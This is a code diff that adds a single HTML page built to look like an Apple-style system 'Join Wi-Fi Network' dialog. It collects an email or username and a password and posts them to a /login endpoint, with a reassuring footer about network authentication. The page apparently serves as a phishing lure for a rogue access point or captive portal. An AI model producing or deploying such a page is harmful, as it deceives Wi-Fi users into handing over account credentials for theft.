@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Wi-Fi</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',
+sans-serif;background:#f2f2f7;display:flex;justify-content:center;
+align-items:center;min-height:100vh}
+.container{width:100%;max-width:380px}
+.header{background:#fff;border-radius:12px 12px 0 0;padding:20px;
+text-align:center;border-bottom:1px solid #e5e5ea}
+.header h1{font-size:1.1em;font-weight:600;color:#000}
+.body-card{background:#fff;padding:24px 20px;border-radius:0 0 12px 12px}
+.field{border-bottom:1px solid #e5e5ea;padding:12px 0}
+.field:last-of-type{border-bottom:none}
+.field label{display:block;font-size:.78em;color:#8e8e93;margin-bottom:4px}
+.field input{width:100%;border:none;font-size:1em;color:#000;
+outline:none;background:transparent;padding:4px 0}
+.actions{margin-top:20px}
+.btn-join{width:100%;padding:14px;border:none;border-radius:10px;
+background:#007aff;color:#fff;font-size:1em;font-weight:600;cursor:pointer}
+.btn-join:active{background:#0062cc}
+.cancel{text-align:center;margin-top:12px}
+.cancel a{color:#007aff;text-decoration:none;font-size:.9em}
+.note{text-align:center;font-size:.7em;color:#8e8e93;margin-top:16px;
+line-height:1.4}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h1>Join Wi-Fi Network</h1>
+</div>
+<form method="POST" action="/login" class="body-card">
+<div class="field">
+<label>Name</label>
+<input type="text" name="username" placeholder="Email or username" required autocomplete="off">
+</div>
+<div class="field">
+<label>Password</label>
+<input type="password" name="password" placeholder="Required" required>
+</div>
+<div class="actions">
+<button type="submit" class="btn-join">Join</button>
+</div>
+<div class="cancel"><a href="#">Cancel</a></div>
+</form>
+<div class="note">Your information is used to authenticate<br>with this Wi-Fi network.</div>
+</div>
+</body>
+</html>
